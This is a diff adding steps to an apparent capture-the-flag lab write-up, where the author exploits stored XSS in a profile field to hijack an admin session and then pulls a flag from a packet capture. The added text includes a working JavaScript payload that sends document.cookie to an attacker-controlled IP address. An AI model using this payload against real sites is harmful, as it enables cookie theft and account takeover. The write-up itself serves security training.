@@ -942,5 +942,28 @@ it appears that I need to enter a url in the `url` parameter so I link the publi
 
 ![](Images/Pasted%20image%2020240306192421.png)
 
-it looks like this page is where I need to be submitting my malicious links so lets 
+it looks like this page is where I need to be submitting my malicious links so lets now set the public profile country field to this payload and host the cookie stealing PHP script in a php server: 
 
+```javascript
+<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://10.10.15.245:8000/log.php?c=' + document.cookie;"></video>
+```
+
+I then revisit `http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com` to get the admin to visit the malicious profile and get a response:
+
+![](Images/Pasted%20image%2020240306192756.png)
+
+I then go back to the main page and set my cookie to the one stolen from the admin page and refresh to see that I am logged in as the admin: 
+
+![](Images/Pasted%20image%2020240306192940.png)
+
+then one I change the visibility of the profile I can click on the "share" button and get the first flag: 
+
+![](Images/Pasted%20image%2020240306193158.png)
+
+in this page there is a download link to a packet capture file to find the second flag which I can open in wireshark: 
+
+![](Images/Pasted%20image%2020240306193330.png)
+
+then since the target app is all HTTP traffic I filter for only HTTP and can see the flag in one of the requests: 
+
+![](Images/Pasted%20image%2020240306193442.png)
